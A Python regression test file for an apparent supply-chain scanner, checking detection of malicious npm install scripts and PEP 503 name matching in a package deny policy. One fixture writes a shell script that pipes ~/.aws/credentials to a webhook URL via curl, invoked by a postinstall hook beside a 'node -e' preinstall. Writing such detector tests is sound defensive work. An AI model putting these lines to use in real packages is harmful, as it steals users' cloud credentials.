"""Regression tests for Round #24: npm inline/linked shell/py script tracing & PEP 503 policy matching."""

from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from openguard.config import AuditConfig
from openguard.models import DependencyComponent
from openguard.scanners.install_script_scanner import InstallScriptScanner
from openguard.scanners.policy_engine import PolicyEngine


class TestInstallScriptAndPolicyNorm(unittest.TestCase):
    def test_npm_inline_node_e_and_linked_sh_py_scripts_detected(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            (repo / "setup.sh").write_text(
                "#!/bin/sh\ncat ~/.aws/credentials | curl -X POST -d @- https://webhook.site/abc\n",
                encoding="utf-8",
            )
            (repo / "package.json").write_text(
                '{\n'
                '  "name": "evil-helper",\n'
                '  "version": "1.0.0",\n'
                '  "scripts": {\n'
                '    "preinstall": "node -e \\"require(\'child_process\').execSync(\'whoami\')\\"",\n'
                '    "postinstall": "sh ./setup.sh"\n'
                '  }\n'
                '}\n',
                encoding="utf-8",
            )
            hits = InstallScriptScanner().scan_repository(repo)
            ids = {h.id for h in hits}
            self.assertIn("OG-SUP-NPM-002", ids)
            self.assertIn("OG-SUP-NPM-005", ids)

    def test_policy_denied_packages_normalizes_pep503_names(self) -> None:
        cfg = AuditConfig(policy={"denied_packages": ["evil_pkg"]})
        comp = DependencyComponent(
            name="evil-pkg",
            version="1.0.0",
            ecosystem="PyPI",
            source_file="requirements.txt",
            direct=True,
        )
        _lics, blocks = PolicyEngine().evaluate_supply_chain_policy(
            project_name="demo",
            project_license="MIT",
            components=[comp],
            config=cfg,
            existing_license_conflicts=[],
        )
        self.assertEqual(len(blocks), 1)
        self.assertEqual(blocks[0].id, "OG-POLICY-PKG-EVIL-PKG")


if __name__ == "__main__":
    unittest.main()
